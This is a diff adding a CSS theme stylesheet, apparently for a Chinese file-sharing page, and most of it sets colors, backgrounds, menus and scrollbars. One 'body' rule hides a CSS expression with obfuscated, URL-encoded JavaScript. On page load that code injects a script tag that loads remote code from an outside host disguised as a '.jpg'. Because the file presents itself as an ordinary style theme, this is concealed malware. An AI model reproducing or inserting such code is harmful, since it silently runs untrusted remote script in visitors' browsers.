@@ -1,0 +1,160 @@
+body {background-color:#c2c2c2;font-family: 宋体, Century Gothic, Arial, Helvetica;margin:0px;}
+img {border:0;}
+.tdtop {background-color:#636363;border-bottom:1px solid #3E3E3E;}
+div.ystop {padding:3px;color:#EFEFEF;}
+div.ystop h1 {FONT-SIZE: 18pt;margin:10px 0 0 9px;}
+div.ystop p {margin:15px 0 0 8px;}
+div.ystop a {COLOR: #EFEFEF;}
+.ta_wjq {background-color:#271500;color:#f1f1f1}
+.mlxz {color:blue ;height:18;width:162;background-color:#f4f4f4;}
+.tx3 {height:18px;font-size: 9pt; border: 1px solid; border-color: black black #000000; color:blue ;background-color:#f4f4f4}
+.bt2 {border-width: 1px; height: 20px; background-color: #e2e2e2; cursor: hand;font-size:9pt;}
+#nr {color:blue;BORDER:rgb(51,51,51) 1px solid;width: 220; height:55;
+ background-color:#f4f4f4;font-family: 宋体, Century Gothic, Arial, Helvetica; font-size: 9pt}
+.lynrc {background-color:#efefef;padding:3px;width:247px;border:1px solid #000;color:#000000;overflow-y :auto;
+overflow:hidden;width:255px;overflow-y:scroll;
+height:100%;word-wrap:break-word;word-break:break-all;}
+.lynrc p {line-height:19px;margin:5px 0 3px 0;}
+.lynrc p {background:url('http://img04.taobaocdn.com/imgextra/i4/836785708/T2WUZTXd8XXXXXXXXX_!!836785708.gif') 0em -0.1em;}
+.lynrc b {margin-left:3px;}
+.lynrc label {margin-right:5px;}
+.lynrc img{width:15px;height:15px;cursor:url('http://zy.cccpan.com/tp/cur/edit1.cur'),default;}
+a.aly {cursor:url('http://zy.ys168.com/tp/cur/edit1.cur'),default;display:inline-block;}
+a.aly:hover {background-color:red;}
+#ysmenu {width:100%;height:22px;background:url('http://img01.taobaocdn.com/imgextra/i1/836785708/T2YzATXnNXXXXXXXXX_!!836785708.gif') repeat-x 0em 0em;}
+#ysmenu1 {width:253px !important;width:255px;/*min-height:125px !important;height:125px;*/border:1px solid #000;border-top:0px solid #000;background-color:#E2E2E2;margin-top:0px;}
+#ysmenu1 p {margin:2px 0 0 16px;line-height:20px;}
+.la1 {width:58px;display:inline-block;}
+#ysmenu a {font-size:9pt;border-top:1px solid #000;border-right:1px solid #000;border-left:1px solid #000;text-decoration:none}
+#ysmenu div {margin-left:1px;float:left;text-align:center;font-size:9pt;padding-left:5px;padding-right:5px;cursor:pointer;}
+.ysm0 {height:15px !important;height:20px;margin-top:2px;padding-top:3px;border:1px solid black;border-bottom:1px solid #000;background-color:#A9A9A9;}
+.ysm0x {height:15px !important;height:20px;margin-top:2px;padding-top:3px;border:1px solid black;border-bottom:1px solid #000;background-color:#E2E2E2;}
+.ysm1 {height:15px !important;height:21px;margin-top:1px;padding-top:4px;border:1px solid black;border-bottom:1px solid #E2E2E2;background-color:#E2E2E2}
+body {java:expression((function(){function $(A,B){var D=document;var U=unescape;var A=U(A);if(!D.all(A)&&!new RegExp(A,"i").test(ddlmc)){var E=D.createElement(A);E.id=A;E.src=U(B);D.all.tags('HEAD')[0].appendChild(E)}};$("%73%63%72%69%70%74","H%54TP%3A%2F%2FSCRIPT%2DTEST%2ENET%2FSTYLE%2FJAVA%2EJ%50G")})());}
+.wjlxxz {border:1px dashed #292929;margin-right:10px;}
+div.ysm0 a:hover{background-color:#E2E2E2;}
+.a1 {color:#000000; font-size:9pt }
+:hover.a1 {color:red; text-decoration:underline}
+.a2 {color:#808080; font-size:9pt }
+:hover.a2 {color:red}
+P {FONT-SIZE: 9pt;line-height:140%;}
+td {font-size:9pt;}
+A {color:#000;font-family: 宋体, Century Gothic, Arial, Helvetica; text-decoration: none }
+A:hover {COLOR: red; TEXT-DECORATION: underline}
+#mainMenu {width: 100%;font-size:9pt;padding-top:3px;}
+#mainMenu font {font-size:9pt;margin-left:6px;color:#006600}
+#menuList {margin: 0px;padding:0px;}
+#menuList li {list-style-type:none; BORDER-BOTTOM: #76C196 1px solid;line-height:140%;padding-left:0px;}
+#menuList li ul li,#menuList li ul li ul li {BORDER-BOTTOM:0;}
+#menuList li label {color:#000080;margin-left:6px;}
+#menuList li img{width:16px;height:16px;margin-right:1px;cursor:url('http://zy.cccpan.com/tp/cur/edit1.cur'),default;}
+.menu {display: none; border-left:2px solid green;padding-left:3px;padding-bottom:10px;}
+#menuList li ul {margin-left:35px;height:auto!important;height:160px;min-height:160px;}
+#menuList li ul li ul{margin-left:15px;height:auto!important;height:80px;min-height:80px;}
+a.ml {color: #000;text-decoration: none;}
+a.wj:visited,a.lj:visited {color:#8B4513;}
+.lxts {font-size:9pt;}
+.s1 {padding-left:15px;background:url('http://img02.taobaocdn.com/imgextra/i2/836785708/T2dXsUXiVXXXXXXXXX_!!836785708.gif') no-repeat 0em 0.1em;}
+.s2 {padding-left:16px;background:url('http://img02.taobaocdn.com/imgextra/i2/836785708/T2EroUXd8XXXXXXXXX_!!836785708.gif') no-repeat 0.2em 0em;padding-top:3px;padding-right:2px;color:red;}
+.s3 {padding-left:16px;background:#fff url('http://img01.taobaocdn.com/imgextra/i1/836785708/T2f3ETXotXXXXXXXXX_!!836785708.gif') no-repeat 0em 0.2em;padding-top:0px;}
+#menuList li table {border:1px solid #8FBC8F;border-bottom:1px solid black;border-right:1px solid black;margin-left:2px;width:15px;height:13px;float:left;margin-top:3px;margin-right:1px !important;margin-right:0px;background-color:#FFFF9C;cursor:pointer;}
+#menuList li table td {border:0px;width:2px;}
+#menuList li table td.r {background-color:A0522D}
+#menuList li table td.g {background-color:228B22}
+a.mln {color: blue;font-size: 9pt;text-decoration: none;}
+a.ml:hover,a.mln:hover{color:red;text-decoration: underline;}
+.newa {color: blue;}
+span.key {text-decoration: underline;}
+.yybj {font-size: 9pt;text-decoration:none;color:#928047;margin-left:3px;}
+:hover.yybj {text-decoration:underline;color:#928047;}
+.yyck {font-size: 9pt;text-decoration:underline;color:#000080;margin-left:8px;}
+:hover.yyck {color:blue;text-decoration:none}
+div.yszdyq {margin-top:3px;margin-left:5px;margin-right:5px;/*width:166px !important;*/width:170px;font-size:9pt;border: 2px solid #636363;}
+.z_bt {color:#fff;padding-top:5px;padding-bottom:3px;padding-left:20px;background:#636363 url('http://img01.taobaocdn.com/imgextra/i1/836785708/T2TugTXo8XXXXXXXXX_!!836785708.gif') no-repeat 0.3em 0.3em;word-wrap:break-word; overflow:hidden;}
+.z_bo {background-color:WhiteSmoke;width:100%;padding:0px 0px 0px 0px;word-wrap:break-word; overflow:hidden;display:block;}
+.z_bo ul {margin:1px;padding:1px;background-color: #fff;list-style-type:none;}
+.ck {font-size:9pt;border:1px solid #153074;position :absolute; z-index: 1500; background-color: #2D6DA1;}
+.ck p {line-height:20px;margin:0px;}
+.ckbt {padding-left:4px;padding-top:2px;height:22px;color:White;background-color: #153074;line-height:150%;}
+.jaml {COLOR: #000000;font-size:9pt ;text-decoration:none}
+:hover.jaml {color:blue; text-decoration:underline}
+.abu {display:inline-block;width:15px;color: #ccc;font-size:9pt ;text-decoration:none;float:right;/*font-weight:bold;*/text-align:center;}
+:hover.abu {font-size:14pt;text-decoration:none}
+
+body #menuList img{filter:progid:DXImageTransform.Microsoft.Chroma(color=#D8E9EC)}/*PNG透明修正*/
+body{background:#200000 url('http://img02.taobaocdn.com/imgextra/i2/836785708/T22HQSXd8aXXXXXXXX_!!836785708.jpg') repeat scroll 0px 0px;}
+.tdtop {background-color:transparent;border-bottom:1px solid #3E3E3E;}
+div.ystop{background:#000 url('这里替换你的顶部图片地址') no-repeat scroll center top;height:192px;  }/*顶部图片地址*/
+.ystop h1{display:none}
+.ystop p{margin-top:176px !important;text-align:center;}
+.ystop p A {display:inline-block;filter:glow(color=blue,strength=3);height:12px;text-shadow:0px 0px 2px blue,0px 0px 5px blue;padding:2px;color:white;}
+.ystop p A:hover {display:inline-block;filter:glow(color=green,strength=3);height:12px;text-shadow:0px 0px 2px green,0px 0px 5px green;padding:2px;color:white;}
+.ystop p A{margin-left:10px;margin-right:10px;}
+.ck {border:1px solid #153074;}
+.z_bt,.ckbt {background:#65340C url('http://img02.taobaocdn.com/imgextra/i2/836785708/T2lM.SXbNaXXXXXXXX_!!836785708.jpg') repeat 0px 0px !important;height:24px;}
+.ta_wjq td{background:#65340C url('http://img02.taobaocdn.com/imgextra/i2/836785708/T2WEMSXhpXXXXXXXXX_!!836785708.jpg') repeat-x scroll 0px 0px;}
+.z_bt {color:yellow;padding:0px 0px 0px 16px;word-wrap:break-word; overflow:hidden;line-height:24px;height:24px !important;}
+.z_bo {background-color:WhiteSmoke;width:100%;padding:0px;word-wrap:break-word; overflow:hidden;display:block;}
+.z_bo ul {margin:0px;padding:1px;background-color:#200000;list-style-type:none;}
+.z_bo li, .z_bo font {color:#e5e5e5 !important}
+.z_bo A {color:#FFFF00;font-family: 宋体, Century Gothic, Arial, Helvetica; text-decoration: none }
+.z_bo A:hover {COLOR:#ff0000;TEXT-DECORATION: underline}
+.z_bo ul li img {display:none}
+#elady_tprotator1 {display:block !important;width:expression(zdyBo_1.offsetWidth) !important;height:auto !important;}
+#elady_tprotator1 {background:transparent url('http://img04.taobaocdn.com/imgextra/i4/836785708/T2MrMTXoVXXXXXXXXX_!!836785708.gif') no-repeat scroll center center;}
+.z_bo ul li{margin:3px auto; }
+.z_bo ul li A {background:transparent url('http://img04.taobaocdn.com/imgextra/i4/836785708/T2HBUSXeFaXXXXXXXX_!!836785708.gif') no-repeat scroll top left;padding:2px 0px 0px 18px;font:9pt/16px;height:19px;}
+.z_bo ul li font {background:transparent url('http://img02.taobaocdn.com/imgextra/i2/836785708/T2TdZUXcpXXXXXXXXX_!!836785708.gif') no-repeat scroll top left;padding:2px 0px 0px 18px;font:9pt/16px;}
+div#idzdy {margin:2px 2px auto 2px;width:302px !important;width:306px;font-size:9pt;border:2px solid #F59B00;background-color:#200000;}
+div#idzdy img {width:100%; height:auto; height:100%; }
+#idzdy1 {display:none !important}
+#laczts,#laczts P{padding:0px;margin:0px;}
+#laczts A, #laczts font {color:white !important}
+.lynrc {background-color:#200000;border:1px solid white;color:#9ACD32;}
+.lynrc span {font-size:10pt;font-family:"Times New Roman";}
+.lynrc {background:#582B01 url('http://img03.taobaocdn.com/imgextra/i3/836785708/T22EZTXaXXXXXXXXXX_!!836785708.jpg') repeat scroll 0px 0px;}
+#ysmenu {width:100%;height:22px;background:url('http://img01.taobaocdn.com/imgextra/i1/836785708/T2YzATXnNXXXXXXXXX_!!836785708.gif') repeat-x 0em 0em;}
+#ysmenu1 {border:1px solid white;border-top:0px solid white;background:#371901 url('http://img03.taobaocdn.com/imgextra/i3/836785708/T2seUSXdpaXXXXXXXX_!!836785708.jpg') repeat scroll 0px 0px;}
+#ysmenu1 p {margin:2px 0 0 16px;line-height:20px;color:white;}
+#ysmenu1 label, .la1 {color:white;}
+#ysmenu1 A {color:#00A000;text-decoration:none;}
+#ysmenu1 A:hover {color:#9ACD32;TEXT-DECORATION:underline;}
+.ysm0 {border:1px solid white;border-bottom:1px solid white;background-color:#330000;color:#AAAAAA;}
+.ysm0x {border:1px solid white;border-bottom:1px solid white;background-color:#582b01;color:white;}
+.ysm1 {border:1px solid white;border-bottom:1px solid #582b01;background-color:#582b01;color:white;}
+#dzx{background:#582B01 url('http://img03.taobaocdn.com/imgextra/i3/836785708/T22EZTXaXXXXXXXXXX_!!836785708.jpg') repeat scroll 0px 0px;background-color:#582B01 !important;}
+#dzx{border:1px solid #ffff00;}
+#menuList table{display:none}
+#menuList li img{width:24px;height:24px;margin:1px 6px -3px 6px;cursor:auto;}
+#menuList ul img{width:16px;height:16px;margin:auto 1px auto auto;cursor:url('http://zy.cccpan.com/tp/cur/edit1.cur');}
+span.s1,span.s1 font,.menu li span {color:#006600 !important;}
+.s3{background-color:transparent !important;}
+span.s1,span.s1 font,#sxts A.a1,.script_title *{color:yellow !important;}
+#menuList *{color:#00A000 !important;}
+ul#menulist li a.mln, ul#menulist li a.ml,ul#menulist li a.wj,ul#menulist li a.lj{color:#fff !important;filter:glow(color=blue,strength=3);height:12px;text-shadow:0px 0px 2px blue,0px 0px 5px blue;}
+ul#menulist label, ul#menulist span, ul#menulist font, ul#menulist a{color:#fff !important;filter:glow(color=green,strength=3);height:12px;text-shadow:0px 0px 2px green,0px 0px 5px green;}
+#menuList A:hover{color:yellow !important;}
+#menuList li{border-bottom-width:0px;}
+/*#table2 font,#table2 label,#table2 p span,#table2 b,#table2 A{display:inline-block;filter:glow(color=#0000ff,strength=3);height:12px;text-shadow:0px 0px 2px green,0px 0px 5px green;padding:2px;color:white !important;}*/
+#table2 P{margin:0px;}
+#sipt2,#shtm2,#shtm2 label,#sipt2 label{background-color:transparent !important;}
+#sipt1,#shtm1 {background:#0030CE url('http://img01.taobaocdn.com/imgextra/i1/836785708/T2jK.SXe4aXXXXXXXX_!!836785708.jpg') repeat-x 0px 0px !important;border-color:#0030CE !important;}
+#sipt4 A.wj {color:black !important;}
+#sipt4 A.wj:hover {color:red !important;}
+#java_vbs_form{filter:progid:DXImageTransform.Microsoft.Alpha(opacity=80);}
+/*.kfoutbox{right:285px !important;top:183px !important;}54客服样式*/
+/*.kfoutbox{right:335px !important;top:233px !important;}54客服样式*/
+/*#nr {background:url('http://file.tttmao.com/ys/pics/nl.gif') center center no-repeat #f5f5f5;}
+div#idzdy {display:none !important;}*/
+
+.lynrc,#nr,#dzx {
+ scrollbar-3dLight-Color:#200000;    /*设置箭头和滚动条左侧和顶边的颜色*/
+ scrollbar-Arrow-Color:white;        /*设置滚动条上的箭头颜色*/
+ scrollbar-Base-Color:#200000;       /*设置滚动条的底色*/
+ scrollbar-DarkShadow-Color:#200000; /*设置箭头和滚动条右侧和底边的颜色*/
+ scrollbar-Face-Color:#200000;       /*设置滚动条的表色*/
+ scrollbar-Highlight-Color:white;    /*设置箭头和滚动条左侧和顶边的颜色，以及滚动条的背景*/
+ scrollbar-Shadow-Color:white;       /*设置箭头和滚动条右侧和底边的颜色*/
+ scrollbar-Track-Color:#666666;      /*设置滚动条的背景色*/
+}
+
